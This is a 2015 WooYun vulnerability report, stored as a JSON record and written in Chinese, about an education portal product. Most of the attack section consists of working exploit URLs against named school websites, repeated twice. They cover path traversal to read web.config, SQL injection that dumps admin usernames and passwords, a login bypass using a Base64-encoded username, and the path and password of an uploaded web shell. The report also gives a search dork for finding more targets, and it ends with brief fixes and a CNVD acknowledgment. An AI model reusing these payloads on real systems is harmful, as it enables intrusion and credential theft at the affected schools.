{"id": 29696, "wybug_id": "wooyun-2015-0118564", "wybug_title": "某教育通用应用任意文件读取AND注入AND奇葩登陆以及拿shell", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Damo", "wybug_date": "2015-06-08 10:12", "wybug_open_date": "2015-09-10 13:44", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向公众公开  简要描述： 问题出现在今天晚上 详细说明：  百度关键字：inurl:ineduportal这里以http://www.fhez.cn测试程序包括内部OA ERP 和考试系统 数据库连接地址1、任意文件读取：\nhttp://www.fhez.cn/IneduPortal/Components/news/FileDown.aspx?OldName=保存文件名.txt&NewName=../web.config\n\n\n2、注入\nhttp://www.fhez.cn/ineduportal/Components/HistoryToDay/historyinfo.aspx?id=1&HTid=11111111111 union all select top 1 1,2,STUFF(login_password,1,0,login_name)  from InforLogin--\n\n\n3、奇葩登陆\nhttp://www.fhez.cn/ineduportal/login.aspx?SysUid=YWRtaW4=\n    SysUid参数为  Base64加密后的用户登录名称    至于用户名可以在新闻详细页底部看到录入人 系统管理员为admin 其他则为拼音首字母或全拼4、拿SHELL登陆后访问后台http://www.fhez.cn/ineduportal/Admin/manage.aspx随便找个可以上传附件的新闻 上传附件即可然后在前台查看新闻即可得到文件上传后的名称 访问下面地址即可\nhttp://www.fhez.cn/ineduportal/UpSource/news/annexs/2015060600306790_1.aspx   密码admin  （望删除）\n\n\n\n\n\n1、读取：http://www.jianlan.com.cn/IneduPortal/Components/news/FileDown.aspx?OldName=aaa.txt&NewName=../web.config\t 注入：http://www.jianlan.com.cn/ineduportal/Components/HistoryToDay/historyinfo.aspx?id=1&HTid=11111111111%20union%20all%20select%20top%201%201,2,STUFF%28login_password,1,0,login_name%29%20%20from%20InforLogin--\t 登陆：http://www.jianlan.com.cn/ineduportal/login.aspx?SysUid=YWRtaW4=     (登录后访问/ineduportal/Admin/manage.aspx进入后台)\t SHELL:案例就不上传了\t2、读取：http://www.hzchyx.com/IneduPortal/Components/news/FileDown.aspx?OldName=aaa.txt&NewName=../web.config\t 注入：http://www.hzchyx.com/ineduportal/Components/HistoryToDay/historyinfo.aspx?id=1&HTid=11111111111%20union%20all%20select%20top%201%201,2,STUFF%28login_password,1,0,login_name%29%20%20from%20InforLogin--\t 登陆：http://www.hzchyx.com/ineduportal/login.aspx?SysUid=YWRtaW4=     (登录后访问/ineduportal/Admin/manage.aspx进入后台)\t SHELL:案例就不上传了3、读取：http://www.shidaiedu.cn/IneduPortal/Components/news/FileDown.aspx?OldName=aaa.txt&NewName=../web.config\t 注入：http://www.shidaiedu.cn/ineduportal/Components/HistoryToDay/historyinfo.aspx?id=1&HTid=11111111111%20union%20all%20select%20top%201%201,2,STUFF%28login_password,1,0,login_name%29%20%20from%20InforLogin--\t 登陆：http://www.shidaiedu.cn/ineduportal/login.aspx?SysUid=YWRtaW4=     (登录后访问/ineduportal/Admin/manage.aspx进入后台)\t SHELL:案例就不上传了4、读取：http://www.hzpjxx.net/IneduPortal/Components/news/FileDown.aspx?OldName=aaa.txt&NewName=../web.config\t 注入：http://www.hzpjxx.net/ineduportal/Components/HistoryToDay/historyinfo.aspx?id=1&HTid=11111111111%20union%20all%20select%20top%201%201,2,STUFF%28login_password,1,0,login_name%29%20%20from%20InforLogin--\t 登陆：http://www.hzpjxx.net/ineduportal/login.aspx?SysUid=YWRtaW4=     (登录后访问/ineduportal/Admin/manage.aspx进入后台)\t SHELL:案例就不上传了5、读取：http://www.hshz.com/IneduPortal/Components/news/FileDown.aspx?OldName=aaa.txt&NewName=../web.config\t 注入：http://www.hshz.com/ineduportal/Components/HistoryToDay/historyinfo.aspx?id=1&HTid=11111111111%20union%20all%20select%20top%201%201,2,STUFF%28login_password,1,0,login_name%29%20%20from%20InforLogin--\t 登陆：http://www.hshz.com/ineduportal/login.aspx?SysUid=YWRtaW4=     (登录后访问/ineduportal/Admin/manage.aspx进入后台)\t SHELL:案例就不上传了更多案例请参考百度关键字结果这里就不一一列举了\n   漏洞证明：  详细信息中的截图以及下面的案例\n1、读取：http://www.jianlan.com.cn/IneduPortal/Components/news/FileDown.aspx?OldName=aaa.txt&NewName=../web.config\t 注入：http://www.jianlan.com.cn/ineduportal/Components/HistoryToDay/historyinfo.aspx?id=1&HTid=11111111111%20union%20all%20select%20top%201%201,2,STUFF%28login_password,1,0,login_name%29%20%20from%20InforLogin--\t 登陆：http://www.jianlan.com.cn/ineduportal/login.aspx?SysUid=YWRtaW4=     (登录后访问/ineduportal/Admin/manage.aspx进入后台)\t SHELL:案例就不上传了\t2、读取：http://www.hzchyx.com/IneduPortal/Components/news/FileDown.aspx?OldName=aaa.txt&NewName=../web.config\t 注入：http://www.hzchyx.com/ineduportal/Components/HistoryToDay/historyinfo.aspx?id=1&HTid=11111111111%20union%20all%20select%20top%201%201,2,STUFF%28login_password,1,0,login_name%29%20%20from%20InforLogin--\t 登陆：http://www.hzchyx.com/ineduportal/login.aspx?SysUid=YWRtaW4=     (登录后访问/ineduportal/Admin/manage.aspx进入后台)\t SHELL:案例就不上传了3、读取：http://www.shidaiedu.cn/IneduPortal/Components/news/FileDown.aspx?OldName=aaa.txt&NewName=../web.config\t 注入：http://www.shidaiedu.cn/ineduportal/Components/HistoryToDay/historyinfo.aspx?id=1&HTid=11111111111%20union%20all%20select%20top%201%201,2,STUFF%28login_password,1,0,login_name%29%20%20from%20InforLogin--\t 登陆：http://www.shidaiedu.cn/ineduportal/login.aspx?SysUid=YWRtaW4=     (登录后访问/ineduportal/Admin/manage.aspx进入后台)\t SHELL:案例就不上传了4、读取：http://www.hzpjxx.net/IneduPortal/Components/news/FileDown.aspx?OldName=aaa.txt&NewName=../web.config\t 注入：http://www.hzpjxx.net/ineduportal/Components/HistoryToDay/historyinfo.aspx?id=1&HTid=11111111111%20union%20all%20select%20top%201%201,2,STUFF%28login_password,1,0,login_name%29%20%20from%20InforLogin--\t 登陆：http://www.hzpjxx.net/ineduportal/login.aspx?SysUid=YWRtaW4=     (登录后访问/ineduportal/Admin/manage.aspx进入后台)\t SHELL:案例就不上传了5、读取：http://www.hshz.com/IneduPortal/Components/news/FileDown.aspx?OldName=aaa.txt&NewName=../web.config\t 注入：http://www.hshz.com/ineduportal/Components/HistoryToDay/historyinfo.aspx?id=1&HTid=11111111111%20union%20all%20select%20top%201%201,2,STUFF%28login_password,1,0,login_name%29%20%20from%20InforLogin--\t 登陆：http://www.hshz.com/ineduportal/login.aspx?SysUid=YWRtaW4=     (登录后访问/ineduportal/Admin/manage.aspx进入后台)\t SHELL:案例就不上传了更多案例请参考百度关键字结果这里就不一一列举了\n   修复方案：  1任意文件下载：虽然在web.config下面设置了某些文件夹的访问权限，但是程序读取是没有限制的，建议加上限制或者最简单的方式就是用流输出的之前加上指定文件夹或者文件判断2注入：就过滤吧  另外参数转换类型也可以3登陆：虽然想做成类似单点登陆，但是也得注意过期时间之类的 等等以及用用户名直接B64也忒简单了点吧4、SHELL：过滤格式   版权声明：转载请注明来源 Damo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-06-12 13:43 厂商回复： CNVD确认所述漏洞情况，暂未建立与软件生产厂商的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}